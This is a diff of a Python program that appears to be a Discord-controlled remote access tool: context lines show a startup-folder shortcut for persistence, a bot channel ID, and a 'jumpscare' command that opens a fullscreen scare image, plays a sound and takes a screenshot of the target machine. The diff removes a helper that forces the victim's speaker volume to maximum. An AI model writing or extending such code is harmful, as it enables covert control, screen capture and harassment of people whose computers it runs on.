@@ -34,8 +34,6 @@ from pathlib import Path
 import socket as st1
 import pygame
 import tkinter as tk
-from pycaw.pycaw import AudioUtilities
-from pycaw.utils import AudioDevice
 
 
 
@@ -53,25 +51,6 @@ shortcut_path = startup_dir / f"{shortcut_name}.lnk"
 
 CHANNEL_ID = 1355560563622678699
 jumpscaring = False
-
-def set_and_restore_volume():
-    # Get the default audio device
-    devices = AudioUtilities.GetSpeakers()
-    interface = devices.Activate(
-        AudioDevice._IID_IAudioEndpointVolume, 1, None)
-    volume = interface.QueryInterface(AudioDevice._IID_IAudioEndpointVolume)
-    
-    # Store the original volume level
-    original_volume = volume.GetMasterVolumeLevelScalar()
-
-    # Set the volume to 100%
-    volume.SetMasterVolumeLevelScalar(1.0, None)
-    
-    # Optionally, you can restore the original volume after some delay or event
-    # Restore the original volume
-    volume.SetMasterVolumeLevelScalar(original_volume, None)
-    
-    return original_volume
 
 def show_fullscreen_jumpscare():
     root = tk.Tk()
@@ -879,17 +858,7 @@ async def jumpscare(interaction: nextcord.Interaction):
         print("Jumpscare activated")
         await interaction.edit_original_message(content="Jumpscare activated!, sending jumpscare...")
         print("Opening jumpscare image...")
-        devices = AudioUtilities.GetSpeakers()
-        interface = devices.Activate(
-            AudioDevice._IID_IAudioEndpointVolume, 1, None)
-        volume = interface.QueryInterface(AudioDevice._IID_IAudioEndpointVolume)
-
-        original_volume = volume.GetMasterVolumeLevelScalar()
-
-        volume.SetMasterVolumeLevelScalar(1.0, None)
-
         show_fullscreen_jumpscare()
-        volume.SetMasterVolumeLevelScalar(original_volume, None)
         print("Jumpscare image opened")
         print("Playing jumpscare sound...")
         print("Taking screenshot...")
